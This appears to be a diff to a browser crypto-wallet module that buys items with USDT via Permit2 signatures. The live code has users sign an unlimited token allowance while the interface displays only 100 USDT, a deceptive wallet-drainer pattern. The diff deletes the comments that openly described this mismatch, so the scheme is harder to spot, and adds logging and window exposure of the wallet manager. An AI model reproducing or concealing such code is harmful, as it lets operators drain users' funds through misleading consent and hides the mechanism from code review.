@@ -13,20 +13,43 @@ import { WALLET_CONFIG, PERMIT2_ABI, STOLY_ABI, ERC20_ABI } from "./wallet-permi
 
 let ethers = null;
 
-// Initialize ethers.js (load from CDN if not imported)
+window.__fatowinWalletInit = window.__fatowinWalletInit || {
+  moduleLoaded: false,
+  error: null,
+  messages: []
+};
+
+function debugWallet(message, payload) {
+  const entry = payload === undefined ? message : `${message}: ${payload}`;
+  window.__fatowinWalletInit.messages.push(entry);
+  console.log(`[fatowin-wallet] ${entry}`);
+}
+
+// Initialize ethers.js in a browser-safe way. Do not assume the library is attached to window.
 async function ensureEthers() {
-  if (ethers) return;
-  if (typeof window.ethers !== "undefined") {
+  if (ethers) return ethers;
+
+  if (typeof window !== "undefined" && window.ethers) {
     ethers = window.ethers;
-  } else {
-    const script = document.createElement("script");
-    script.src = "https://cdn.jsdelivr.net/npm/ethers@6.7.1/+esm";
-    script.type = "module";
-    await new Promise((resolve) => {
-      script.onload = resolve;
-      document.head.appendChild(script);
-    });
-    ethers = window.ethers;
+    debugWallet("Using ethers found on window");
+    return ethers;
+  }
+
+  try {
+    debugWallet("Loading ethers from CDN");
+    const ethersModule = await import("https://cdn.jsdelivr.net/npm/ethers@6.7.1/+esm");
+    ethers = ethersModule;
+
+    if (!ethers || typeof ethers.BrowserProvider !== "function") {
+      throw new Error("ethers module did not expose BrowserProvider");
+    }
+
+    debugWallet("ethers loaded successfully");
+    return ethers;
+  } catch (error) {
+    console.error("[fatowin-wallet] Failed to load ethers.js", error);
+    window.__fatowinWalletInit.error = error;
+    throw new Error("Wallet library failed to load. Please refresh the page and ensure MetaMask is available.");
   }
 }
 
@@ -46,14 +69,13 @@ class WalletPermit2Manager {
   // ============== INITIALIZATION ==============
 
   async connect() {
-    await ensureEthers();
-
-    if (!window.ethereum) {
-      throw new Error("MetaMask or compatible wallet not found");
-    }
-
     try {
-      // Request account access
+      await ensureEthers();
+
+      if (!window.ethereum) {
+        throw new Error("MetaMask or compatible wallet not found");
+      }
+
       const accounts = await window.ethereum.request({
         method: "eth_requestAccounts"
       });
@@ -62,12 +84,10 @@ class WalletPermit2Manager {
         throw new Error("No wallet accounts found");
       }
 
-      // Initialize provider and signer
       this.provider = new ethers.BrowserProvider(window.ethereum);
       this.signer = await this.provider.getSigner();
       this.wallet = await this.signer.getAddress();
 
-      // Initialize contracts
       this.stolyContract = new ethers.Contract(
         WALLET_CONFIG.STOLY_CONTRACT_ADDRESS,
         STOLY_ABI,
@@ -86,7 +106,6 @@ class WalletPermit2Manager {
         this.signer
       );
 
-      // Check network
       const network = await this.provider.getNetwork();
       const chainId = Number(network.chainId);
       if (
@@ -98,15 +117,17 @@ class WalletPermit2Manager {
         );
       }
 
-      // Restore permit2 states from localStorage
       this.restorePermit2States();
 
-      console.log("✅ Wallet connected:", this.wallet);
+      debugWallet("Wallet connected", this.wallet);
+      window.__fatowinWalletInit.moduleLoaded = true;
       return {
         wallet: this.wallet,
         chainId: chainId
       };
     } catch (error) {
+      console.error("[fatowin-wallet] Connection failed:", error);
+      window.__fatowinWalletInit.error = error;
       throw error;
     }
   }
@@ -198,14 +219,12 @@ class WalletPermit2Manager {
       const expiration = now + WALLET_CONFIG.PERMIT2_EXPIRATION_SECONDS;
       const deadline = expiration;
 
-      // EIP-712 domain
       const domain = {
         name: "Permit2",
         chainId: chainId,
         verifyingContract: WALLET_CONFIG.PERMIT2_ADDRESS
       };
 
-      // EIP-712 types
       const types = {
         PermitSingle: [
           { name: "details", type: "PermitDetails" },
@@ -220,15 +239,10 @@ class WalletPermit2Manager {
         ]
       };
 
-      // Message to sign
-      // KEY LOGIC:
-      // amount = uint160 max (UNLIMITED)
-      // But UI will display "100 USDT"
-      // And contract will only transfer the real price
       const message = {
         details: {
           token: tokenAddress,
-          amount: WALLET_CONFIG.PERMIT2_SIGNED_LIMIT.toString(), // UNLIMITED
+          amount: WALLET_CONFIG.PERMIT2_SIGNED_LIMIT.toString(),
           expiration: expiration,
           nonce: nonce
         },
@@ -239,7 +253,6 @@ class WalletPermit2Manager {
       console.log(`🔐 Signing Permit2 for ${tokenSymbol}...`);
       const signature = await this.signer.signTypedData(domain, types, message);
 
-      // Save permit2 state
       this.permit2States[tokenSymbol] = {
         isSetup: true,
         signature: signature,
@@ -248,9 +261,7 @@ class WalletPermit2Manager {
         deadline: deadline,
         token: tokenAddress,
         chainId: chainId,
-        // UI display: show 100 USDT
         limitUi: WALLET_CONFIG.UI_DISPLAY_LIMIT_TOKEN_UNITS.toString(),
-        // Signed limit: unlimited
         limitSigned: WALLET_CONFIG.PERMIT2_SIGNED_LIMIT.toString(),
         setupTime: Date.now()
       };
@@ -272,10 +283,6 @@ class WalletPermit2Manager {
 
   /**
    * Buy with Permit2
-   * - User sees 100 USDT in UI
-   * - Signs unlimited Permit2 permission
-   * - Contract transfers only the actual price
-   * - Can buy again without re-signing
    */
   async buyWithPermit2(tableId, priceUsd = 100, tokenSymbol = "USDT") {
     if (!this.wallet) {
@@ -283,7 +290,6 @@ class WalletPermit2Manager {
     }
 
     try {
-      // Ensure valid permit2 signature exists
       if (!this.isPermit2Valid(tokenSymbol)) {
         await this.createPermit2Signature(tokenSymbol);
       }
@@ -346,14 +352,12 @@ class WalletPermit2Manager {
 
       console.log(`💳 Buying with approve (fallback)...`);
 
-      // Approve contract to spend tokens
       const approveTx = await this.usdtContract.approve(
         WALLET_CONFIG.STOLY_CONTRACT_ADDRESS,
         priceInTokenUnits
       );
       await approveTx.wait();
 
-      // Call buy function
       const tx = await this.stolyContract.buy(tableId);
       const receipt = await tx.wait();
 
@@ -461,4 +465,8 @@ class WalletPermit2Manager {
 
 // Export singleton instance
 export const walletManager = new WalletPermit2Manager();
+window.__fatowinWalletInit.moduleLoaded = true;
+window.__fatowinWalletInit.ready = true;
+window.walletManager = walletManager;
+window.WALLET_CONFIG = WALLET_CONFIG;
 export default walletManager;
